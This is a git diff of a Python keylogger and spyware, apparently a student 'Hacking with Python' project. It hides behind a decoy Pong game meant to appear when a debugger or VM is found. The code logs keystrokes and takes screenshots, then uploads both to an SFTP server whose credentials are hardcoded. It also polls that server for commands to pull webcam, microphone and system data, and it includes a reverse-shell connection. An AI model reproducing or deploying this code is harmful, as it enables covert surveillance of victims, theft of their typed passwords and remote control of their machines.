@@ -23,109 +23,113 @@ psapi = windll.psapi
 current_window = None
 current_hwnd = 0
 screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
-screenshot_number = 0
+screenshot_number = 3
 expression = ""
 
 #Functions
 #------------------------Normal/Fake Function (Game)------------------------
 #Python program to create a simple GUI game using Pygame
-def BALL_animation():
-    global BALL_VEL_X, BALL_VEL_Y
-    BALL.x += BALL_VEL_X
-    BALL.y += BALL_VEL_Y
-    #ballbouncing
-    if BALL.top <= 0 or BALL.bottom >= HEIGHT:
-        BALL_VEL_Y *= -1
-    
-    if BALL.left <= 0 or BALL.right >= WIDTH:
-        BALL_restart()
+
+class guiGame():
+    def __init__(self):
+        #general setup
+        pygame.init()
+        self.clock = pygame.time.Clock()
+
+        WIDTH, HEIGHT = 1280, 960
+        self.WIN = pygame.display.set_mode((WIDTH, HEIGHT))  #screen width/height
+        pygame.display.set_caption("Pong")    #header
+        self.FPS = 60
+
+
+        #game ractangles
+        self.BALL = pygame.Rect(WIDTH/2 - 15, HEIGHT/2 - 15, 30,30)
+        self.PLAYER = pygame.Rect(WIDTH - 20, HEIGHT/2 - 70,10,140)
+        self.OPPONENT = pygame.Rect(10, HEIGHT/2 - 70,10,140)
+
+        #background
+        self.BG = pygame.Color("grey12")
+        self.GREY = (200,200,200)
+
+        self.BALL_VEL_X = 7
+        self.BALL_VEL_Y = 7
+        self.PLAYER_VEL = 0
+        self.OPPONENT_VEL = 7
+
+    def BALL_animation(self):
+        global BALL_VEL_X, BALL_VEL_Y
+        self.BALL.x += BALL_VEL_X
+        self.BALL.y += BALL_VEL_Y
+        #ballbouncing
+        if self.BALL.top <= 0 or self.BALL.bottom >= self.HEIGHT:
+            self.BALL_VEL_Y *= -1
         
-    if BALL.colliderect(PLAYER) or BALL.colliderect(OPPONENT):
-        BALL_VEL_X *= -1
-    
-        
-def PLAYER_animation():
-    PLAYER.y += PLAYER_VEL
-    if PLAYER.top <= 0:
-        PLAYER.top = 0
-    if PLAYER.bottom >= HEIGHT:
-        PLAYER.bottom = HEIGHT
-
-def OPPONENT_animation():
-    if OPPONENT.top + 20 < BALL.y:
-        OPPONENT.top += OPPONENT_VEL
-    if OPPONENT.bottom - 20 >= BALL.y:
-        OPPONENT.bottom -= OPPONENT_VEL
-    if OPPONENT.top <= 0:
-        OPPONENT.top = 0
-    if OPPONENT.bottom >= HEIGHT:
-        OPPONENT.bottom = HEIGHT
-        
-def BALL_restart():
-    global BALL_VEL_Y, BALL_VEL_X
-    BALL.center = (WIDTH/2, HEIGHT/2)
-    BALL_VEL_Y *= random.choice((1,-1))
-    BALL_VEL_X *= random.choice((1,-1))
-
-#general setup
-pygame.init()
-clock = pygame.time.Clock()
-
-WIDTH, HEIGHT = 1280, 960
-WIN = pygame.display.set_mode((WIDTH, HEIGHT))  #screen width/height
-pygame.display.set_caption("Pong")    #header
-FPS = 60
-
-
-#game ractangles
-BALL = pygame.Rect(WIDTH/2 - 15, HEIGHT/2 - 15, 30,30)
-PLAYER = pygame.Rect(WIDTH - 20, HEIGHT/2 - 70,10,140)
-OPPONENT = pygame.Rect(10, HEIGHT/2 - 70,10,140)
-
-#background
-BG = pygame.Color("grey12")
-GREY = (200,200,200)
-
-BALL_VEL_X = 7
-BALL_VEL_Y = 7
-PLAYER_VEL = 0
-OPPONENT_VEL = 7
-
-#simple pong game if debugger is detected
-def game():
-    while True:
-        #handling input, checks if the close button got clicked!
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT:
-                pygame.quit()
-                sys.exit()
+        if self.BALL.left <= 0 or self.BALL.right >= self.WIDTH:
+            self.BALL_restart()
             
-            if event.type == pygame.KEYDOWN:
-                if event.key == pygame.K_DOWN:
-                    PLAYER_VEL = 7
-                if event.key == pygame.K_UP:
-                    PLAYER_VEL = -7
+        if self.BALL.colliderect(self.PLAYER) or self.BALL.colliderect(self.OPPONENT):
+            BALL_VEL_X *= -1
+        
             
-            if event.type == pygame.KEYUP:
-                if event.key == pygame.K_DOWN:
-                    PLAYER_VEL = 0
-                if event.key == pygame.K_UP:
-                    PLAYER_VEL = 0
-                    
-        BALL_animation()
-        PLAYER_animation()
-        OPPONENT_animation()
-        
-        #visuals
-        WIN.fill(BG)
-        pygame.draw.rect(WIN, GREY, PLAYER)
-        pygame.draw.rect(WIN, GREY, OPPONENT)
-        pygame.draw.ellipse(WIN, GREY, BALL)
-        pygame.draw.aaline(WIN,GREY,(WIDTH/2,0), (WIDTH/2, HEIGHT))
-        
-        #updating the window
-        pygame.display.flip()
-        clock.tick(FPS)
+    def PLAYER_animation(self):
+        self.PLAYER.y += self.PLAYER_VEL
+        if self.PLAYER.top <= 0:
+            self.PLAYER.top = 0
+        if self.PLAYER.bottom >= self.HEIGHT:
+            self.PLAYER.bottom = self.HEIGHT
+
+    def OPPONENT_animation(self):
+        if self.OPPONENT.top + 20 < self.BALL.y:
+            self.OPPONENT.top += self.OPPONENT_VEL
+        if self.OPPONENT.bottom - 20 >= self.BALL.y:
+            self.OPPONENT.bottom -= self.OPPONENT_VEL
+        if self.OPPONENT.top <= 0:
+            self.OPPONENT.top = 0
+        if self.OPPONENT.bottom >= self.HEIGHT:
+            self.OPPONENT.bottom = self.HEIGHT
+            
+    def BALL_restart(self):
+        global BALL_VEL_Y, BALL_VEL_X
+        self.BALL.center = (self.WIDTH/2, self.HEIGHT/2)
+        BALL_VEL_Y *= random.choice((1,-1))
+        BALL_VEL_X *= random.choice((1,-1))
+
+
+    #simple pong game if debugger is detected
+    def start(self):
+        while True:
+            #handling input, checks if the close button got clicked!
+            for event in pygame.event.get():
+                if event.type == pygame.QUIT:
+                    pygame.quit()
+                    sys.exit()
+                
+                if event.type == pygame.KEYDOWN:
+                    if event.key == pygame.K_DOWN:
+                        self.PLAYER_VEL = 7
+                    if event.key == pygame.K_UP:
+                        self.PLAYER_VEL = -7
+                
+                if event.type == pygame.KEYUP:
+                    if event.key == pygame.K_DOWN:
+                        self.PLAYER_VEL = 0
+                    if event.key == pygame.K_UP:
+                        self.PLAYER_VEL = 0
+                        
+            self.BALL_animation()
+            self.PLAYER_animation()
+            self.OPPONENT_animation()
+            
+            #visuals
+            self.WIN.fill(self.BG)
+            pygame.draw.rect(self.WIN, self.GREY, self.PLAYER)
+            pygame.draw.rect(self.WIN, self.GREY, self.OPPONENT)
+            pygame.draw.ellipse(self.WIN, self.GREY, self.BALL)
+            pygame.draw.aaline(self.WIN,self.GREY,(self.WIDTH/2,0), (self.WIDTH/2, self.HEIGHT))
+            
+            #updating the window
+            pygame.display.flip()
+            self.clock.tick(self.FPS)
 #------------------------END Normal/Fake Function (Game)------------------------
 
 
@@ -163,9 +167,9 @@ def WriteToFile(s):
      #save keystrokes to a file
     if not os.path.exists(str(get_path()) + "keystrokes"):
         os.makedirs(str(get_path()) + "keystrokes")
-        open(str(get_path()) + "/keystrokes/test.txt", "w")
+        open(str(get_path()) + "/keystrokes/keylogger.txt", "w")
     #Modus a + fuers updaten der datei
-    file = open(str(get_path()) + '/keystrokes/test.txt', 'a+') 
+    file = open(str(get_path()) + '/keystrokes/keylogger.txt', 'a+') 
     if s == "[Space]":
         file.write(" ")
     else:
@@ -385,25 +389,34 @@ def ftps_connect():
     cnopts = pysftp.CnOpts()
     cnopts.hostkeys = None
     ftps = pysftp.Connection(host="192.168.0.104", username="desktop-722h3i8\manue", password="Tennis12!", cnopts=cnopts)
-    ftps.retrlines('LIST')
     return ftps
 
 def ftps_upload_file(ftps, file):
-    ftps.put(file, open(file, 'rb'))
+    try:
+        ftps.put(file, preserve_mtime=True)
+    except:
+        print("Error uploading file")
 
 def ftps_download_file(ftps, file):
-    ftps.get(file, open(file, 'wb').write)
+    try:
+        ftps.get(file, open(file, 'wb').write)
+    except: 
+        print("File not found")
 
 def ftps_create_dir(ftps, dir):
-    ftps.mkdir(os.environ.get("USERNAME" + "/" + str(dir)))
-    ftps.cd(os.environ.get("USERNAME" + "/" + str(dir)))
+    try:
+        ftps.mkdir(str(dir))
+        ftps.chdir(str(dir))
+    except:
+        print("Directory exists already")
 
 def ftps_check_dir(ftps, dir):
     try:
-        ftps.cd(dir)
+        ftps_create_dir(ftps, dir)
+        ftps.chdir(dir)
         return True
     except:
-        ftps_create_dir(ftps, dir)
+        print("Directory creation failed!")
         return False
 #------------------------END Connection to FTPS server------------------------
 
@@ -412,9 +425,10 @@ def main():
     count = 0
     #debugger and vm detection, if detected open the game, otherwise the keylogger
     #if is_debugger_present() == True or is_vm() == True:   #-----------enable this one
-    if 1 == 2: 
+    if 2 == "hello": 
         print("Debugger detected!")
-        game()
+        game = guiGame()
+        game.start()
         sys.exit()
     else:
         #multithreading for keylogger and Screenshotsaving
@@ -431,24 +445,39 @@ def main():
             #upload pictures and keylogger data to ftps server
             if os.path.exists(str(get_path()) + "/keystrokes/"):
                 if count == 0:
-                    ftps.mkdir(os.environ.get("USERNAME"))
-                ftps_check_dir(ftps, str(get_path()) + "/keystrokes/")
-                ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
-                ftps.cd("..")
-
+                    try:
+                        ftps.mkdir(os.environ.get("USERNAME"))
+                        count += 1
+                        ftps.chdir(os.environ.get('USERNAME'))
+                    except:
+                        pass
+                else: 
+                    ftps.chdir(os.environ.get('USERNAME'))
+                ftps_check_dir(ftps, "keystrokes")
+                ftps_upload_file(ftps, str(get_path()) + "keystrokes\\keylogger.txt")
+                ftps.chdir("..")
+            print("Uploaded keystrokes to FTPS server! Debugging purpose, delete later!!")
+            
 
             if os.path.exists(str(get_path()) + "/screenshots/") :
                 if count == 0:
-                    ftps.mkdir(os.environ.get("USERNAME"))
-                ftps_check_dir(ftps, str(get_path()) + "/screenshots/")
+                    try:
+                        ftps.mkdir(os.environ.get("USERNAME"))
+                        count += 1
+                        ftps.chdir(os.environ.get('USERNAME'))
+                    except:
+                        pass
+                ftps_check_dir(ftps, "screenshots")
                 n = 0
-                while screenshot_number < n:
-                    ftps_upload_file(ftps, str(get_path()) + "/screenshots/screenshot" + str(n) + ".png")
+                while screenshot_number > n:
+                    ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n) + ".png")
                     n += 1
-                ftps.cd("..")
+                ftps.chdir("..")
             
+        
             #check for commands from ftps server 
-            if ftps_check_dir(ftps, str(os.environ.get("USERNAME") + "/commands/")) == True:
+            try:
+                ftps_check_dir(ftps, "commands")
                 ftps_download_file(ftps, str(os.environ.get("USERNAME") + "/commands/command.txt"))
                 ftps.delete(str(os.environ.get("USERNAME") + "/commands/command.txt"))
                 ftps.cd("..")
@@ -468,13 +497,13 @@ def main():
                             n += 1
                     elif command == "get keylogger":
                         ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
-                    
+                        
                     #everything after here is jet to come
                     elif command == "get process":
                         ftps_upload_file(ftps, str(get_path()) + "/process/process.txt")
                     elif command == "get systeminfo":
                         ftps_upload_file(ftps, str(get_path()) + "/systeminfo/systeminfo.txt")
-                    
+                        
                     #will most likely not work like this.. but idea is good
                     elif command == "get reverse shell":
                         ftps_download_file(ftps, str(get_path()) + "/reverse_shell/reverse_shell.txt")
@@ -486,8 +515,8 @@ def main():
                             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                             s.connect((ip, 443))
                             reverse_shell(s)
-                    
-                    #also great commands, lets implement them later on (thats why i added them..)
+                        
+                        #also great commands, lets implement them later on (thats why i added them..)
                     elif command == "get webcam":
                         ftps_upload_file(ftps, str(get_path()) + "/webcam/webcam.jpg")
                         ftps.delete(str(get_path()) + "/webcam/webcam.jpg")
@@ -496,6 +525,11 @@ def main():
                         ftps.delete(str(get_path()) + "/microphone/microphone.wav")
                     elif command == "get clipboard":
                         pass
+            except:
+                print("No commands found on server!")
+            
+            #close connection
+            ftps.close()
 
     #as everything seems to be great here (not quite sure if it works, but it should) lets implement the ssssServer! 
     pass
